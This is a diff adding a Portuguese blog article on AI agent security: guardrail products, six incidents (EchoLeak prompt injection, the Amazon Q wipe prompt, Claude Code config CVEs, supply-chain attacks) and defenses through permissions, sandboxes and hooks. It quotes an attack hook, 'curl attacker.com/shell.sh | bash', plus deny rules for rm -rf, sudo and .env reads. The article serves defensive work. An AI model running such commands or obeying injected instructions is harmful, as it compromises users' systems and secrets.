+    <span class="n">source</span><span class="o">=</span><span class="s2">&quot;INPUT&quot;</span><span class="p">,</span>
+    <span class="n">content</span><span class="o">=</span><span class="p">[{</span><span class="s2">&quot;text&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;text&quot;</span><span class="p">:</span> <span class="s2">&quot;user question&quot;</span><span class="p">,</span>
+                        <span class="s2">&quot;qualifiers&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;guard_content&quot;</span><span class="p">]}}],</span>
+<span class="p">)</span>
+</code></pre></div>
+<p><a href="https://aws.amazon.com/bedrock/pricing/">Pricing</a> publicado: $0.15 por 1.000 unidades de texto para content filters ou denied topics, $0.10 para PII filters ou contextual grounding. Uma unidade de texto vai até 1.000 caracteres.</p>
+<h3 id="azure-ai-content-safety">Azure AI Content Safety</h3>
+<p>Fornece <strong>Prompt Shields</strong> como endpoint unificado que "detects and blocks adversarial user input attacks... direct and indirect threats." A Azure também é <a href="https://learn.microsoft.com/en-us/azure/ai-services/content-safety/concepts/jailbreak-detection">franca</a>: <em>"You can't use Azure AI Content Safety to detect illegal child exploitation images,"</em> e a qualidade multilingue está limitada a oito línguas avaliadas.</p>
+<h3 id="openai-moderation-and-openai-guardrails">OpenAI Moderation and OpenAI Guardrails</h3>
+<p><code>omni-moderation-latest</code> é a baseline multimodal gratuita. Separadamente, <a href="https://github.com/openai/openai-guardrails-python"><code>openai-guardrails-python</code></a> (documentação em <a href="https://guardrails.openai.com">guardrails.openai.com</a>) é a resposta framework da OpenAI: um pipeline de três fases (pre-flight, input, output) com Jailbreak Detection, Hallucination Detection via FileSearch, NSFW, PII via Presidio e LLM-as-judge. <code>GuardrailAgent</code> integra-se no Agents SDK.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">guardrails</span><span class="w"> </span><span class="kn">import</span> <span class="n">GuardrailsOpenAI</span><span class="p">,</span> <span class="n">GuardrailTripwireTriggered</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">GuardrailsOpenAI</span><span class="p">(</span><span class="n">config</span><span class="o">=</span><span class="s2">&quot;guardrail_config.json&quot;</span><span class="p">)</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">responses</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="n">model</span><span class="o">=</span><span class="s2">&quot;gpt-5&quot;</span><span class="p">,</span> <span class="nb">input</span><span class="o">=</span><span class="s2">&quot;...&quot;</span><span class="p">)</span>
+<span class="k">except</span> <span class="n">GuardrailTripwireTriggered</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;blocked: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="o-padrao-por-baixo-dos-produtos">O padrão por baixo dos produtos</h3>
+<p>Duas observações que se aplicam aos sete.</p>
+<p>Primeiro, <strong>há poucos números públicos sobre latência e throughput</strong>. Bedrock, Azure e Lakera publicam preços mas não garantias para latência no pior caso (o número "p99" do 99.º percentil — o que define quão lentos ficam os teus requests mais lentos). A Meta também não publica garantias de endpoint alojado para o Llama Guard. A NVIDIA fornece o NemoGuard como microserviços descarregáveis que tu alojas, por isso pagas a infraestrutura e defines os teus próprios níveis de serviço. Cada guardrail que adicionas é mais uma chamada a modelo no critical path. Se empilhares três deles de forma ingénua (um input shield, um output shield, uma verificação de hallucination), podes triplicar a latência end-to-end face a geração simples. O dashboard de p99 será a primeira coisa a dizer-to.</p>
+<p>Segundo, e este é o ponto central do artigo, <strong>nenhum destes produtos afirma cobrir</strong> política ao nível de tool-call, autenticação MCP, exfiltração multi-step através de conteúdo recuperado, sequestro do objetivo do agente via ficheiros de configuração ou execução de código que acontece <em>antes de o modelo ser sequer invocado</em>. Filtram tokens. Os agentes agem fora do stream de geração do modelo, nas chamadas a ferramentas, nos ficheiros e na rede, onde nenhum classificador de tokens os consegue ver.</p>
+<hr />
+<h2 id="ameacas-a-seguranca-de-agentes-de-ia-seis-incidentes-e-o-top-10-owasp-asi">Ameaças à segurança de agentes de IA: seis incidentes e o Top 10 OWASP ASI</h2>
+<p>A diferença entre "filtrar tokens" e "proteger o loop" deixou de ser académica em meados de 2025. Seis incidentes em dezoito meses alteraram o modelo de ameaças. Nenhum deles teria sido travado por qualquer produto da secção anterior.</p>
+<h3 id="echoleak-cve-2025-32711-cvss-93">EchoLeak — CVE-2025-32711, CVSS 9.3</h3>
+<p>Divulgado pela Aim Labs em junho de 2025 contra o Microsoft 365 Copilot, com o write-up técnico agora alojado na Cato Networks (que absorveu a equipa de investigação da Aim Security) sob a assinatura de Itay Ravia, antigo Head of Aim Labs (<a href="https://www.catonetworks.com/blog/breaking-down-echoleak/">write-up</a>). Um email cuidadosamente construído, formulado como instruções <em>para o destinatário humano</em>, passou pelo XPIA (o filtro embutido da Microsoft que procura ataques de prompt-injection nos inputs do Copilot). A partir daí foi puxado para a camada de retrieval do Copilot — a parte do sistema que pesquisa os teus documentos para encontrar contexto para respostas — através de um truque a que os investigadores chamam <em>RAG-spraying</em>: o atacante planta a mesma instrução maliciosa em muitos documentos indexados, para que o retrieval quase de certeza puxe pelo menos um deles para o contexto do modelo. Já lá dentro, o Copilot incorporou obedientemente os dados mais sensíveis da sessão num link Markdown que apontava para uma imagem num domínio controlado pelo atacante. A Teams preview API, a correr num domínio em que as próprias políticas de browser da Microsoft já confiavam, foi buscar automaticamente esse URL da imagem e, ao fazê-lo, entregou os dados ao atacante. <strong>Zero cliques.</strong> A Aim Labs deu o nome "LLM Scope Violation" a esta classe de ataque: o modelo a atravessar uma fronteira que nunca devia atravessar, usando apenas operações que cada sistema individual considerava legítimas.</p>
+<p>Cada passo parecia legítimo isoladamente. O email era dirigido a um humano. O retrieval puxou um documento que devia puxar. O link Markdown foi renderizado como os links Markdown são renderizados. O fetch da imagem atingiu um domínio allowlisted. O XPIA não tinha nada a assinalar porque nada, por si só, era assinalável. O sistema foi comprometido. O modelo não.</p>
+<h3 id="amazon-q-developer-vs-code-v1840-julho-de-2025">Amazon Q Developer VS Code v1.84.0 — julho de 2025</h3>
+<p>A AWS distribuiu uma build comprometida depois de um atacante ter feito commit de um ficheiro de system prompt malicioso através de um token GitHub do CodeBuild com escopo excessivo (<a href="https://github.com/aws/aws-toolkit-vscode/security/advisories/GHSA-7g7f-ff96-5gcw">advisory</a>). O prompt injetado instruía o agente a "clean a system to a near-factory state and delete file-system and cloud resources." Um erro de sintaxe impediu a execução real nas ~950.000 instalações. A AWS revogou credenciais, removeu o código e distribuiu a v1.85.0. <!-- 🌶️ --> O payload falhou por causa de um erro de sintaxe, não por causa de um controlo.</p>
+<h3 id="azure-mcp-server-cve-2026-32211-cvss-91">Azure MCP Server — CVE-2026-32211, CVSS 9.1</h3>
+<p>O exemplo mais claro da camada errada. O <a href="https://cvefeed.io/vuln/detail/CVE-2026-32211">feed CVE</a> regista-o como <em>"Missing authentication for critical function in Azure MCP Server allows an unauthorized attacker to disclose information over a network."</em> O MCP SDK não tem autenticação embutida. Este servidor esqueceu-se de adicionar uma. Nenhum filtro de conteúdo é alguma vez invocado porque o modelo nem entra na equação. O atacante fala diretamente com a ferramenta.</p>
+<h3 id="claude-code-cve-2025-59536-cvss-87">Claude Code CVE-2025-59536 — CVSS 8.7</h3>
+<p>A vulnerabilidade canónica de confiança em configuração de agente. Aviv Donenfeld e Oded Vanunu, da Check Point, <a href="https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/">divulgaram</a> que <em>"repository-defined configurations defined through <code>.mcp.json</code> and <code>.claude/settings.json</code> files could be exploited by an attacker to override explicit user approval... by setting the <code>enableAllProjectMcpServers</code> option to true."</em></p>
+<p>Vale a pena percorrer a cadeia de ataque com calma:</p>
+<ol>
+<li>A vítima clona um repo não confiável.</li>
+<li>Um hook <code>SessionStart</code> executa <code>curl attacker.com/shell.sh | bash</code> <em>antes</em> de aparecer a caixa de diálogo de trust do Claude Code.</li>
+<li><code>.mcp.json</code> aprova automaticamente servidores MCP não confiáveis.</li>
+<li><code>ANTHROPIC_BASE_URL</code> (o CVE complementar CVE-2026-21852, CVSS 5.3) redireciona silenciosamente todas as chamadas à API do Claude, incluindo Bearer tokens, para um host controlado pelo atacante.</li>
+</ol>
+<p>Corrigido no Claude Code 1.0.111 e 2.0.65 respetivamente (advisory <a href="https://github.com/anthropics/claude-code/security/advisories">GHSA-ph6w-f82w-28w6</a>). O resumo da Check Point é o que interessa reter: <em>"traditional prompt injection defenses... provide zero protection."</em> O código do atacante corre na tua máquina (aquilo a que o pessoal de segurança chama remote code execution, ou RCE) antes de o modelo ser sequer invocado.</p>
+<h3 id="axios-1141-31-de-marco-de-2026">Axios 1.14.1 — 31 de março de 2026</h3>
+<p>O maintainer <a href="https://github.com/axios/axios/issues/10636">jasonsaayman</a> no post-mortem: <em>"two malicious versions of axios (1.14.1 and 0.30.4) were published to the npm registry through my compromised account. Both versions injected a dependency called <code>plain-crypto-js@4.2.1</code> that installed a remote access trojan on macOS, Windows, and Linux."</em> Um remote access trojan é malware que abre discretamente uma backdoor — permite ao atacante executar comandos, ler ficheiros e observar o que escreves a partir de outro ponto na internet. Janela de exposição: cerca de três horas. Atribuição: UNC1069 (Sapphire Sleet), segundo o grupo de threat intelligence da Google. Qualquer coding agent que tenha executado <code>npm install</code> nessa janela trouxe a backdoor consigo. O modelo nunca esteve envolvido. <!-- 🌶️ --> Nunca está, nesta classe.</p>
+<h3 id="trivy-actions-tag-hijack-ghsa-69fq-xp46-6x23-19-de-marco-de-2026">Trivy Actions Tag Hijack — GHSA-69fq-xp46-6x23, 19 de março de 2026</h3>
+<p>Um atacante reescreveu 76 de 77 version tags em <code>aquasecurity/trivy-action</code> — o repositório que inúmeras pipelines de CI usam para security scanning — de forma a que as tags passassem a apontar para malware de roubo de credenciais em vez do código real do Trivy. Substituiu todas as 7 tags em <code>setup-trivy</code> da mesma forma e distribuiu um binário <code>v0.69.4</code> que recolhia variáveis de ambiente (palavras-passe, chaves API, tokens — o conteúdo de <code>/proc/&lt;pid&gt;/environ</code> em Linux) diretamente dos runners do GitHub Actions (<a href="https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23">Aqua advisory</a>). Qualquer coding agent que tenha executado <code>npm install</code> ou um passo de security scan durante a janela executou automaticamente o payload, porque os agentes confiam em tags da mesma forma que os humanos, ou seja, completamente.</p>
+<h3 id="o-top-10-owasp-asi-edicao-de-2026">O Top 10 OWASP ASI, edição de 2026</h3>
+<p>A OWASP (Open Worldwide Application Security Project, a organização sem fins lucrativos por trás da lista Top 10 canónica de vulnerabilidades web em torno da qual a maioria dos programas de segurança se orienta) viu isto a chegar. A sua Agentic Security Initiative é um working group focado especificamente em agentes conduzidos por LLM, e em 9 de dezembro de 2025 publicou o <a href="https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/">Agentic Security Initiative Top 10 for 2026</a>: um catálogo ordenado das dez categorias de vulnerabilidade que distinguem sistemas agentic de apps LLM clássicas.</p>
+<p>Vale a pena ler a lista devagar. Apoia-se em onde os incidentes do mundo real se têm concentrado, cruzado com o que a comunidade de segurança mais alargada assinala como modos de falha mais consequentes em deployments de agentes em produção. Lê-a como uma checklist do que um modelo de ameaças moderno para agentes deve cobrir:</p>
+<p><img alt="Top 10 OWASP ASI para 2026" src="../../../../assets/2026-04-20-the-guardians/owasp-asi-top-10.svg" /></p>
+<p>Conta as categorias que um filtro de conteúdo aborda primariamente. ASI01 parcialmente, talvez parte do ASI06. Chamemos-lhe duas em dez. <strong>As outras oito dizem respeito ao harness.</strong> EchoLeak mapeia para ASI01. Amazon Q mapeia para ASI04 e ASI02. Azure MCP é ASI03. Claude Code CVE-2025-59536 é ASI05 + ASI04 + ASI03. Axios e Trivy são ASI04. A distribuição dos incidentes e a distribuição da OWASP concordam sobre a forma de 2026: a classe de ameaça dominante mudou para baixo do modelo.</p>
+<hr />
+<h2 id="permissoes-sao-infraestrutura-nao-prompt">Permissões são infraestrutura, não prompt</h2>
+<p>Esta é a parte em que os guardrails deixam de ser o produto e passam a ser um subsistema de um harness. Três sistemas em abril de 2026 (OpenAI Agents SDK, Codex CLI e Claude Code) mostram o aspeto de uma superfície de políticas de produção. Os três impõem permissões em código. Nenhum depende de o modelo ser cuidadoso.</p>
+<h3 id="openai-agents-sdk">OpenAI Agents SDK</h3>
+<p>O <a href="https://openai.github.io/openai-agents-python/mcp/">SDK</a> separa <em>harness</em> de <em>compute</em>. Ferramentas MCP alojadas aceitam <code>require_approval</code> — uma string (<code>"always"</code> / <code>"never"</code>) ou um dict por ferramenta — mais um callback <code>on_approval_request</code> que dispara quando uma ferramenta é gated. Filtragem de ferramentas com granularidade fina (<code>tool_filter</code>) está disponível nas variantes de servidor local (<code>MCPServerStdio</code>, <code>MCPServerStreamableHttp</code>, <code>MCPServerSse</code>) se precisares disso:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">agents</span><span class="w"> </span><span class="kn">import</span> <span class="n">Agent</span><span class="p">,</span> <span class="n">HostedMCPTool</span>
+
+<span class="n">agent</span> <span class="o">=</span> <span class="n">Agent</span><span class="p">(</span>
+    <span class="n">name</span><span class="o">=</span><span class="s2">&quot;Ops&quot;</span><span class="p">,</span>
+    <span class="n">tools</span><span class="o">=</span><span class="p">[</span><span class="n">HostedMCPTool</span><span class="p">(</span>
+        <span class="n">tool_config</span><span class="o">=</span><span class="p">{</span>
+            <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;mcp&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;server_label&quot;</span><span class="p">:</span> <span class="s2">&quot;github&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;server_url&quot;</span><span class="p">:</span> <span class="s2">&quot;https://mcp.example.com&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;require_approval&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;delete_repo&quot;</span><span class="p">:</span> <span class="s2">&quot;always&quot;</span><span class="p">,</span>
+                                  <span class="s2">&quot;list_issues&quot;</span><span class="p">:</span> <span class="s2">&quot;never&quot;</span><span class="p">},</span>
+        <span class="p">},</span>
+        <span class="n">on_approval_request</span><span class="o">=</span><span class="k">lambda</span> <span class="n">r</span><span class="p">:</span>
+            <span class="s2">&quot;approve&quot;</span> <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">tool_name</span> <span class="o">==</span> <span class="s2">&quot;list_issues&quot;</span> <span class="k">else</span> <span class="s2">&quot;reject&quot;</span><span class="p">,</span>
+    <span class="p">)],</span>
+<span class="p">)</span>
+</code></pre></div>
+<p>O callback de aprovação é código. A política de aprovação por ferramenta é código. Podes ler este ficheiro. Podes testá-lo. Podes fazer diff. Nada disso é verdade para um system prompt que diz "please be careful with production."</p>
+<h3 id="codex-cli-e-a-camada-de-politica-gerida">Codex CLI e a camada de política gerida</h3>
+<p>O coding harness da OpenAI inclui um ficheiro de <a href="https://developers.openai.com/codex/enterprise/managed-configuration">managed-configuration</a> que os departamentos de IT distribuem para os Macs dos colaboradores através do sistema de gestão de dispositivos (o mesmo mecanismo que usam para instalar certificados ou definições de VPN). O ficheiro vive em <code>/etc/codex/requirements.toml</code> e atua como camada de hard constraint — regras que as definições ao nível do projeto não podem contornar, independentemente do que um programador escreva na sua própria configuração:</p>
+<div class="highlight"><pre><span></span><code><span class="k">[[rules.prefix_rules]]</span>
+<span class="n">pattern</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[{</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;rm&quot;</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">any_of</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;-rf&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;-fr&quot;</span><span class="p">]</span><span class="w"> </span><span class="p">}]</span>
+<span class="n">decision</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;forbidden&quot;</span>
+<span class="n">justification</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Recursive force-delete prohibited by IT policy&quot;</span>
+</code></pre></div>
+<p>Dois detalhes de desenho. <code>prefix_rules.decision</code> aceita apenas <code>"prompt"</code> ou <code>"forbidden"</code>, nunca <code>"allow"</code>. Um projeto não pode conceder a si próprio uma permissão que a camada gerida proíbe. E as allowlists de MCP são indexadas tanto pelo nome <em>como</em> pela identidade (string de comando ou URL), para que um projeto não possa afirmar que é <code>github-mcp</code> e apontar para o servidor de um atacante.</p>
+<h3 id="a-escada-de-permissoes-do-claude-code">A escada de permissões do Claude Code</h3>
+<p>A mais elaborada da indústria. Cada chamada a ferramenta passa por seis gates por ordem (<a href="https://code.claude.com/docs/en/permission-modes">docs</a>): <code>deny → ask → PreToolUse hooks → allow → mode → canUseTool</code>. Os hooks têm precedência sobre os modes, e um <code>permissionDecision: "deny"</code> vindo de um hook bloqueia a execução mesmo sob <code>bypassPermissions</code>.</p>
+<p><img alt="Ordem de avaliação de permissões do Claude Code" src="../../../../assets/2026-04-20-the-guardians/permission-evaluation-order.svg" /></p>
+<p>Os modes alternam <code>default → acceptEdits → plan</code> com Shift+Tab. <code>auto</code>, <code>bypassPermissions</code> e <code>dontAsk</code> ativam-se sob condições de entrada específicas que a camada de política enterprise-managed pode bloquear. Isto é mais do que um ficheiro de configuração validado quanto à correção. É uma máquina de estados com regras de precedência, publicada para que uma equipa de segurança possa raciocinar sobre ela.</p>
+<h3 id="tres-blast-radii-num-so-ficheiro">Três blast radii num só ficheiro</h3>
+<p>Esta é a forma de uma configuração de permissões estilo Codex com três perfis:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># ~/.codex/config.toml</span>
+<span class="n">approval_policy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;auto&quot;</span>
+<span class="n">sandbox_mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;workspace-write&quot;</span>
+
+<span class="k">[profiles.ci]</span>
+<span class="n">approval_policy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;read-only&quot;</span>
+<span class="n">sandbox_mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;read-only&quot;</span>
+
+<span class="k">[profiles.release]</span>
+<span class="n">approval_policy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;full-access&quot;</span>
+<span class="n">sandbox_mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;workspace-write&quot;</span>
+
+<span class="k">[mcp_servers.github]</span>
+<span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;gh-mcp&quot;</span>
+<span class="n">args</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;--readonly&quot;</span><span class="p">]</span>
+</code></pre></div>
+<p>Três perfis, três blast radii, sem prompt a dizer ao agente para ter cuidado. Se o agente tentar algo fora do seu perfil, a sandbox ao nível do SO diz que não. Seatbelt em macOS, bubblewrap mais seccomp em Linux, restricted tokens em Windows. A opinião do modelo não entra.</p>
+<h3 id="a-imposicao-de-sandbox-e-uma-questao-do-so">A imposição de sandbox é uma questão do SO</h3>
+<p>O kernel faz aqui o trabalho real. Cada SO dá-te um toolkit diferente, e as duas CLIs nem sempre escolhem a mesma peça:</p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Claude Code</th>
+<th>Codex CLI</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>macOS</td>
+<td>Seatbelt via <code>sandbox-exec</code> with an SBPL (Seatbelt Profile Language) profile</td>
+<td>Seatbelt via <code>sandbox-exec -p</code></td>
+</tr>
+<tr>
+<td>Linux</td>
+<td>bubblewrap + socat network proxy</td>
+<td>bubblewrap + seccomp (legacy Landlock via <code>use_legacy_landlock</code>)</td>
+</tr>
+<tr>
+<td>Windows</td>
+<td>WSL2 required</td>
+<td>Native restricted tokens / AppContainer + ACL + capability SIDs</td>
+</tr>
+</tbody>
+</table>
+<p>Concordam onde o SO só dá uma opção (Seatbelt, bubblewrap) e divergem onde não dá. O Claude Code ignora Windows e envia-te para WSL2. O Codex distribui uma sandbox nativa para Windows. De uma forma ou de outra, a imposição acontece no kernel, não no modelo.</p>
+<p>O caminho Linux do Codex empilha quatro locks ao nível do kernel: <code>PR_SET_NO_NEW_PRIVS</code> (o processo nunca pode ganhar privilégios extra, mesmo que tente), um filtro seccomp (o kernel recusa diretamente a maioria das system calls; neste caso, tudo o que abra um network socket exceto Unix sockets locais), um <code>/proc</code> isolado e novo (o processo não consegue ver o resto da máquina) e <code>RLIMIT_CORE=0</code> (sem crash dumps, para que nada fuja por aí). Em Windows há dois modes, <code>unelevated</code> (um processo com restricted token que perde privilégios mas continua a correr como o utilizador) e <code>elevated</code> (um utilizador de sandbox dedicado isolado por regras de firewall), mais pequenos executáveis falsos colocados antes no <code>PATH</code> do sistema para que tentativas do agente de executar <code>curl</code> ou <code>wget</code> atinjam o interceptor em vez da ferramenta real. Há aqui toda uma subdisciplina de engenharia, e o modelo nunca entra na equação. É aqui que está o trabalho real.</p>
+<h3 id="para-alem-do-claude-code-e-do-codex-o-que-usa-o-resto-da-industria">Para além do Claude Code e do Codex: o que usa o resto da indústria</h3>
+<p>Se estiveres a construir o teu próprio agente, "sandbox" acaba por ser um termo guarda-chuva. As opções open source sentam-se num espectro — wrappers leves de namespaces numa ponta, microVMs completas na outra — e a que escolhes depende de quanto confias no código que corre lá dentro.</p>
+<p><strong>Isolamento leve — mesmo kernel, menos privilégios:</strong></p>
+<ul>
+<li><a href="https://github.com/containers/bubblewrap">bubblewrap</a> — um wrapper de namespaces mais seccomp. A mesma ferramenta que o Flatpak usa, a mesma a que o Claude Code recorre em Linux. Rápida, barata, adequada para tooling confiável.</li>
+<li>Contentores Docker / OCI standard — isolamento por namespaces sobre um kernel de host partilhado. <strong>Não é uma sandbox</strong> para código não confiável; a própria documentação do gVisor diz isso claramente ("containers are not a sandbox"). Razoável como ponto de partida quando emparelhado com seccomp e AppArmor, nada mais.</li>
+</ul>
+<p><strong>Isolamento application-kernel — o agente fala com um kernel falso:</strong></p>
+<ul>
+<li><a href="https://github.com/google/gvisor">gVisor</a> — o kernel user-space da Google. O teu contentor pensa que está em Linux; as syscalls são na realidade intercetadas por uma implementação de kernel em Go. A superfície de ataque do kernel do host encolhe drasticamente, sem overhead de VM. Usado pela Modal.</li>
+</ul>
+<p><strong>Isolamento total com VM — um kernel dedicado por sandbox:</strong></p>
+<ul>
+<li><a href="https://github.com/firecracker-microvm/firecracker">Firecracker</a> — a tecnologia microVM da AWS, a mesma que corre o Lambda. ~125ms de cold starts. Cada sandbox recebe o seu próprio kernel Linux real dentro de KVM. Um kernel escape numa sandbox não afeta o host nem qualquer sibling.</li>
+<li><a href="https://github.com/kata-containers/kata-containers">Kata Containers</a> — UX de contentor, isolamento de grau VM. Para onde vão os clusters Kubernetes quando precisam de correr código não confiável.</li>
+</ul>
+<p><strong>Plataformas — o que alugarias em vez de construir:</strong></p>
+<ul>
+<li><a href="https://e2b.dev">E2B</a> envolve o Firecracker numa API alojada. Usado pela Perplexity, Manus e pela maior parte da Fortune 100.</li>
+<li>O <a href="https://github.com/alibaba/OpenSandbox">OpenSandbox da Alibaba</a> deixa-te escolher o runtime — gVisor, Kata ou Firecracker — atrás de um único SDK.</li>
+<li>O <a href="https://opensource.microsoft.com/blog/2026/04/02/introducing-the-agent-governance-toolkit-open-source-runtime-security-for-ai-agents/">Agent Governance Toolkit</a> da Microsoft (licença MIT, abril de 2026) adiciona um motor de políticas em runtime por cima. Enforcement abaixo de um milissegundo, direcionado diretamente ao Top 10 OWASP ASI.</li>
+</ul>
+<p><strong>Regra prática.</strong> Correr os teus próprios scripts através de um agente? bubblewrap e seccomp chegam. Correr código gerado por LLM ou ferramentas de terceiros não confiáveis? Pelo menos gVisor. MicroVMs se o blast radius realmente importar — multi-tenant, compliance ou qualquer coisa virada para cliente.</p>
+<p>Claude Code e Codex escolheram do mesmo menu que toda a gente. Só o envolveram de forma diferente.</p>
+<hr />
+<h2 id="hooks-pretooluse-como-politica-programavel">Hooks PreToolUse como política programável</h2>
+<p>Modes e allowlists resolvem os casos fáceis: "deixa o agente editar ficheiros mas não correr bash", "nega tudo o que se pareça com <code>rm -rf</code>." Falham no momento em que a tua política precisa de lógica real. Queres bloquear <code>git push</code> só quando a branch é <code>main</code>. Queres negar qualquer Edit que toque num ficheiro que corresponda a uma regex de segredos. Queres rate-limit de chamadas shell por sessão, ou enviar cada invocação de ferramenta para o teu audit log central (o SIEM, o security information and event management system que a tua equipa de segurança já observa).</p>
+<p>Nada disto cabe numa allowlist estática. É para isso que servem os hooks — <strong>comandos shell que o Claude Code executa em pontos específicos do ciclo de vida de chamadas a ferramentas</strong>, com o poder de inspecionar a chamada pendente e devolver um allow/deny estruturado. O Claude Code expõe uma dúzia de eventos de ciclo de vida (a lista completa está <a href="https://code.claude.com/docs/en/hooks">na documentação</a>), e um deles reordena tudo o resto: um hook <code>PreToolUse</code> que devolve <code>permissionDecision: "deny"</code> bloqueia uma ferramenta independentemente do mode.</p>
+<p>Esta é a forma das settings:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;defaultMode&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;acceptEdits&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;deny&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;Bash(rm -rf:*)&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Bash(sudo:*)&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Read(.env*)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;hooks&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;PreToolUse&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">            </span><span class="p">{</span>
+<span class="w">                </span><span class="nt">&quot;matcher&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Bash&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;hooks&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">                    </span><span class="p">{</span>
+<span class="w">                        </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;command&quot;</span><span class="p">,</span>
+<span class="w">                        </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;.claude/hooks/pre-bash-firewall.sh&quot;</span>
+<span class="w">                    </span><span class="p">}</span>
+<span class="w">                </span><span class="p">]</span>
+<span class="w">            </span><span class="p">},</span>
+<span class="w">            </span><span class="p">{</span>
+<span class="w">                </span><span class="nt">&quot;matcher&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Edit|Write&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;hooks&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">                    </span><span class="p">{</span>
+<span class="w">                        </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;command&quot;</span><span class="p">,</span>
+<span class="w">                        </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;.claude/hooks/protect-paths.sh&quot;</span>
+<span class="w">                    </span><span class="p">}</span>
+<span class="w">                </span><span class="p">]</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">]</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Um hook pode ser um script shell de cinco linhas ou um policy engine completo. A forma do retorno é o que importa:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;hookSpecificOutput&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;permissionDecision&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;deny&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;permissionDecisionReason&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;writes outside workspace prohibited&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>O modelo vê um deny estruturado. O reasoning loop da <a href="/blog/2026/01/31/the-cognitive-engine--choosing-the-right-reasoning-loop/">Parte 1</a> trata-o como qualquer outra observação de ferramenta: a negação torna-se contexto, o agente replana, o loop continua. Esta é a pequena mas importante razão por que continuo a dizer que permissões são infraestrutura. Está ligado ao mesmo mecanismo que trata um 500 de uma ferramenta HTTP. Não é um workflow de segurança separado que tenha de ser acrescentado à pressa.</p>
